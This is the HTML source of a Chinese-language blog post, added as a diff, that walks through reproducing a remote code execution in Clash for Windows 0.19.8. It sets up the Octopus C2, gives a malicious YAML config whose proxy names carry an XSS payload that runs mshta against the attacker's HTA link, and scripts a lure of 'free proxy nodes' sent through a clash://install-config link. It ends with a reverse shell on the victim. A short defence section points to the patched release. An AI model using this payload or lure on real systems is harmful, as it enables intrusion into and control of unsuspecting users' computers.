@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='喵～猫猫能有什么坏心思呢QAQ'><title>Clash猫猫RCE复现(弹shell)</title>
+
+<link rel='canonical' href='https://kira-pgr.github.io/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/'>
+
+<link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='Clash猫猫RCE复现(弹shell)'>
+<meta property='og:description' content='喵～猫猫能有什么坏心思呢QAQ'>
+<meta property='og:url' content='https://kira-pgr.github.io/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/'>
+<meta property='og:site_name' content='猫猫の博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='exploit' /><meta property='article:published_time' content='2022-02-25T23:27:12-05:00'/><meta property='article:modified_time' content='2022-02-25T23:27:12-05:00'/><meta property='og:image' content='https://kira-pgr.github.io/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/cover.jpg' />
+<meta name="twitter:title" content="Clash猫猫RCE复现(弹shell)">
+<meta name="twitter:description" content="喵～猫猫能有什么坏心思呢QAQ"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://kira-pgr.github.io/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/cover.jpg' /><head>
+    <style>
+ .blur {
+   color: transparent;
+   text-shadow:0px 0px 8px rgba(0,0,0,0.5)
+}
+
+.blur:hover {
+   color: transparent;
+   text-shadow:0px 0px 0px rgba(0,0,0,1)
+
+}
+
+.shady {
+   color:#000;
+   font-weight: bold;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+   transition: all 0.3s ease;
+}
+.shady:hover{
+  font-weight: bold;
+   color:#FFF;
+   box-shadow: 0px -20px 0px rgba(0,0,0,1) inset; 
+}
+</style>
+</head>
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/zh-cn/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu6303347a79895c67737217ae3756b054_237429_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/zh-cn">猫猫の博客</a></h1>
+            <h2 class="site-description">Cat, but learning CS</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Kira-Pgr'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/zh-cn/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/%E5%85%B3%E4%BA%8E%E6%9C%AC%E5%96%B5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于本喵</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>猫の存档</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>猫の搜索</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/zh-cn/%E7%8C%AB%E3%81%AE%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>猫の链接</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+                <li id="i18n-switch">  
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
+                        
+                            <option value="https://kira-pgr.github.io/" >English</option>
+                        
+                            <option value="https://kira-pgr.github.io/zh-cn/" selected>中文</option>
+                        
+                    </select>
+                </li>
+            
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/">
+                <img src="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/cover_hu12a48eb127ba99e3f348b4c7f466d0c6_650772_800x0_resize_q75_box.jpg"
+                        srcset="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/cover_hu12a48eb127ba99e3f348b4c7f466d0c6_650772_800x0_resize_q75_box.jpg 800w, /zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/cover_hu12a48eb127ba99e3f348b4c7f466d0c6_650772_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="554" 
+                        loading="lazy"
+                        alt="Featured image of post Clash猫猫RCE复现(弹shell)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/zh-cn/categories/security/" >
+                Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/">Clash猫猫RCE复现(弹shell)</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            喵～猫猫能有什么坏心思呢QAQ
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 25, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="clash-for-windows-rce弹shell">Clash For Windows RCE弹Shell</h1>
+<hr>
+<p>小白:RCE是什么</p>
+<p><del>大佬:Reliable Computer Engineering (可靠的电脑工程)</del></p>
+<p><strong>咳咳，应该是Remote Code Execution(远程代码执行)= =</strong></p>
+<hr>
+<h2 id="免责声明">免责声明</h2>
+<p><strong>本文章为PGR的个人漏洞复现笔记，仅供参考/学习，如用文章中技术造成任何损失的后果自负</strong></p>
+<h2 id="前期准备">前期准备</h2>
+<blockquote>
+<p><strong>Tip:请使用一个Linux机器和一个Windows机器，否则可能会出现&lt;意想不到&gt;的问题</strong></p>
+<p><strong>(没有Linux? 去下载一个<a class="link" href="https://www.kali.org/get-kali/"  target="_blank" rel="noopener"
+    >Kali Linux</a>吧)</strong></p>
+</blockquote>
+<h3 id="一个有漏洞的clash-windows-客户端">一个有漏洞的Clash Windows 客户端</h3>
+<p><a class="link" href="https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.8/Clash.for.Windows-0.19.8-win.7z"  target="_blank" rel="noopener"
+    >下载地址</a></p>
+<p>下载后按照提示在Windows系统下安装即可</p>
+<h3 id="c2工具octopus">C2工具Octopus</h3>
+<p><strong>在一个装好了Python3和Git的Linux系统执行以下的操作</strong></p>
+<blockquote>
+<p>如果你没有安装，请参考</p>
+<ul>
+<li>
+<p><a class="link" href="https://kira-pgr.github.io/posts/hugo1/#%E5%AE%89%E8%A3%85git%E7%B3%BB%E7%BB%9F%E5%B7%B2%E7%BB%8F%E9%A2%84%E8%A3%85%E7%9A%84%E8%87%AA%E8%A1%8C%E5%BF%BD%E7%95%A5"  target="_blank" rel="noopener"
+    >安装Git</a></p>
+</li>
+<li>
+<p>安装Python3: 终端输入sudo apt install python3</p>
+</li>
+</ul>
+<p>(由于大部分系统已经预装，如果你非deb系请自主上网搜索安装方式)</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">git clone https://github.com/mhaskar/Octopus.git
+<span class="nb">cd</span> Octopus
+pip install -r requirements.txt
+python3 octopus.py
+</code></pre></div><p>成功安装后你会看到如下界面</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">┌─<span class="o">[</span>askar@hackbook<span class="o">]</span>─<span class="o">[</span>/opt/redteaming/Octopus<span class="o">]</span>
+└──╼ <span class="nv">$python3</span> octopus.py
+
+
+
+      ___           ___                       ___           ___         ___           ___
+     /  /<span class="se">\ </span>        /  /<span class="se">\ </span>         ___        /  /<span class="se">\ </span>        /  /<span class="se">\ </span>      /__/<span class="se">\ </span>        /  /<span class="se">\
+</span><span class="se"></span>    /  /::<span class="se">\ </span>      /  /:/         /  /<span class="se">\ </span>     /  /::<span class="se">\ </span>      /  /::<span class="se">\ </span>     <span class="se">\ </span> <span class="se">\:\ </span>      /  /:/_
+   /  /:/<span class="se">\:\ </span>    /  /:/         /  /:/     /  /:/<span class="se">\:\ </span>    /  /:/<span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:\ </span>    /  /:/ /<span class="se">\
+</span><span class="se"></span>  /  /:/  <span class="se">\:\ </span>  /  /:/  ___    /  /:/     /  /:/  <span class="se">\:\ </span>  /  /:/~/:/  ___  <span class="se">\ </span> <span class="se">\:\ </span>  /  /:/ /::<span class="se">\
+</span><span class="se"></span> /__/:/ <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/  /  /<span class="se">\ </span> /  /::<span class="se">\ </span>   /__/:/ <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/ /:/  /__/<span class="se">\ </span> <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/ /:/<span class="se">\:\
+</span><span class="se"></span> <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ /__/:/<span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\/</span>:/   <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\/</span>:/~/:/
+  <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:\ </span> /:/  <span class="se">\_</span>_<span class="se">\/</span>  <span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:</span>:/     <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:</span>:/ /:/
+   <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\ </span> <span class="se">\:\/</span>:/        <span class="se">\ </span> <span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\ </span> <span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\_</span>_<span class="se">\/</span> /:/
+    <span class="se">\ </span> <span class="se">\:</span>:/       <span class="se">\ </span> <span class="se">\:</span>:/          <span class="se">\_</span>_<span class="se">\/</span>    <span class="se">\ </span> <span class="se">\:</span>:/       <span class="se">\ </span> <span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:</span>:/        /__/:/
+     <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>                     <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>       <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>
+
+
+                    v1.2 stable !
+
+
+ Octopus C2 <span class="p">|</span> Control your shells
+
+
+Octopus &gt;&gt;
+</code></pre></div><p>之后再运行只需要输入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">python3 octopus.py
+</code></pre></div><h3 id="apache2">Apache2</h3>
+<p>deb系</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sudo apt install apache2
+</code></pre></div><p>yum系</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sudo yum -y install httpd
+sudo firewall-cmd --permanent --add-port<span class="o">=</span>80/tcp
+sudo firewall-cmd --permanent --add-port<span class="o">=</span>443/tcp
+sudo firewall-cmd --reload
+</code></pre></div><p>其他系统请参考<a class="link" href="https://httpd.apache.org/docs/2.4/install.html"  target="_blank" rel="noopener"
+    >官方网站</a></p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<h3 id="linux攻击机器">Linux(攻击机器)</h3>
+<p>在刚刚下好的Octopus目录下打开终端</p>
+<p>输入<code>python3 octopus.py</code></p>
+<p>进入Octopus界面后输入如下内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">listen_http Linux的ip <span class="m">5555</span> Linux的ip <span class="m">5</span> 随便起一个名字.php 名字
+generate_hta 名字
+</code></pre></div><hr>
+<p>面向想做Hacker的<strong>小白</strong>的提醒 <strong>(大佬们可以直接略过了)</strong></p>
+<ul>
+<li>
+<p>获取IP: 在终端输入<code>ifconfig</code></p>
+</li>
+<li>
+<p>请不要<strong>傻瓜式抄命令</strong>，这里的<strong>ip/名字</strong>都是需要自己改的</p>
+</li>
+</ul>
+<hr>
+<p>现在Octopus已经开始监听了QAQ,记下Octopus给出的链接，并把这个终端放一边 <strong>(别关掉)</strong></p>
+<p><img src="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1.png"
+	width="318"
+	height="24"
+	srcset="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1_hu0562a55e3665f92b18a7212d3551942f_8236_480x0_resize_box_3.png 480w, /zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/1_hu0562a55e3665f92b18a7212d3551942f_8236_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="链接示例"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1325"
+		data-flex-basis="3180px"
+	
+></p>
+<p>在Apache站点的默认目录<code>/var/www/html/</code>里放入我们的恶意配置文件，并命名为<code>RCE.yaml</code></p>
+<p>命令如下:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sudo vi RCE.yaml
+</code></pre></div><p>写入如下内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">7890</span><span class="w">
+</span><span class="w"></span><span class="nt">socks-port</span><span class="p">:</span><span class="w"> </span><span class="m">7891</span><span class="w">
+</span><span class="w"></span><span class="nt">allow-lan</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span><span class="w"></span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="l">Rule</span><span class="w">
+</span><span class="w"></span><span class="nt">log-level</span><span class="p">:</span><span class="w"> </span><span class="l">info</span><span class="w">
+</span><span class="w"></span><span class="nt">external-controller</span><span class="p">:</span><span class="w"> </span><span class="p">:</span><span class="m">9090</span><span class="w">
+</span><span class="w"></span><span class="nt">proxies</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接(记住只需要一对双引号)&#34;])&#39;);&gt;</span><span class="w">
+</span><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
+</span><span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
+</span><span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;17938&#34;</span><span class="w">
+</span><span class="w">    </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">abc</span><span class="w">
+</span><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
+</span><span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
+</span><span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;8088&#34;</span><span class="w">
+</span><span class="w">    </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nt">proxy-groups</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span>-<span class="w">
+</span><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接&#34;])&#39;);&gt;</span><span class="w">
+</span><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">select</span><span class="w">
+</span><span class="w">    </span><span class="nt">proxies</span><span class="p">:</span><span class="w">
+</span><span class="w">    </span>- <span class="l">a&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接&#34;])&#39;);&gt;</span><span class="w">
+</span></code></pre></div><blockquote>
+<p>原理：这是一个XSS漏洞，把payload放进Proxy的名字里，即可实现任意js代码执行，这里是执行指令mshta(命令) &lt;Octopus生成的hta链接&gt;(参数)</p>
+</blockquote>
+<p>按下<code>Esc</code>键并输入<code>:wq</code>保存并退出</p>
+<p>之后，攻击者就可以吃西瓜静等上线了</p>
+<p>诶嘿嘿= =</p>
+<h3 id="windows某个可怜的小白的机器">Windows(某个可怜的小白的机器)</h3>
+<p>PGR可是从来不欺负小白的哦 <del>(坏笑)</del></p>
+<hr>
+<p>模拟社工过程：</p>
+<p>Hacker: &ldquo;需要白嫖Clash节点吗QAQ???&rdquo;</p>
+<p>小白: &ldquo;好啊&rdquo;</p>
+<p>Hacker: &ldquo;这是你要的节点<code>clash://install-config?url=xxx&amp;name=RCE</code>&rdquo;</p>
+<hr>
+<p><del><strong>咳咳，逃～～</strong></del></p>
+<p>在Windows任意浏览器里输入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">clash://install-config?url=http://Linux的ip/RCE.yaml<span class="err">&amp;</span>name=名字
+</code></pre></div><p><strong>Tip:记得换IP和名字</strong></p>
+<p>然后在弹出的提示点<code>打开(Open)Clash For Windows</code></p>
+<p><img src="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2.jpg"
+	width="672"
+	height="232"
+	srcset="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2_hua885acc8b430d11c5301250d668e065f_391390_480x0_resize_q75_box.jpg 480w, /zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2_hua885acc8b430d11c5301250d668e065f_391390_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="提示"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="289"
+		data-flex-basis="695px"
+	
+></p>
+<p>进入<code>Profiles</code>页面</p>
+<p>选择<code>你取的名字(这里是RCE).yaml</code></p>
+<p><img src="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3.jpg"
+	width="1695"
+	height="852"
+	srcset="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3_hu8045fe0fc415d8a0347b05d041892f72_86987_480x0_resize_q75_box.jpg 480w, /zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/3_hu8045fe0fc415d8a0347b05d041892f72_86987_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="RCE.yaml(建议实战的时候别用这名字  逃= =)"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="477px"
+	
+></p>
+<p>切到<code>Proxies</code>页面并点击那个<code>a</code>(这一步不是必须的，因为这个RCE有些不稳定)</p>
+<p><img src="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4.jpg"
+	width="1594"
+	height="751"
+	srcset="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_480x0_resize_q75_box.jpg 480w, /zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/4_hu4f4507ac000a93ce63b6aba3a699f6a3_52668_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="嘛= ="
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="509px"
+	
+></p>
+<h3 id="成功getshell-露出恶毒的笑容">成功GetShell <del>(露出恶毒的笑容)</del></h3>
+<p>Octopus收到了反弹的shell,可以 <strong>&lt;为所欲为&gt;</strong> 了</p>
+<p><img src="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh.jpg"
+	width="1239"
+	height="667"
+	srcset="/zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_480x0_resize_q75_box.jpg 480w, /zh-cn/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/sh_hu22102e79db7ccd777d3f8d8bf10bc55e_106570_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="西瓜shell"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="445px"
+	
+></p>
+<p>输入<code>interact 1</code>即可在那台倒霉Windows上执行任意cmd指令啦.QWQ.</p>
+<h2 id="漏洞防御">漏洞防御</h2>
+<p>目前Clash官方已经发布了修复漏洞的最新版本</p>
+<p><a class="link" href="https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.10/Clash.for.Windows-0.19.10-win.7z"  target="_blank" rel="noopener"
+    >下载链接</a></p>
+<h2 id="ref">Ref</h2>
+<p><a class="link" href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710"  target="_blank" rel="noopener"
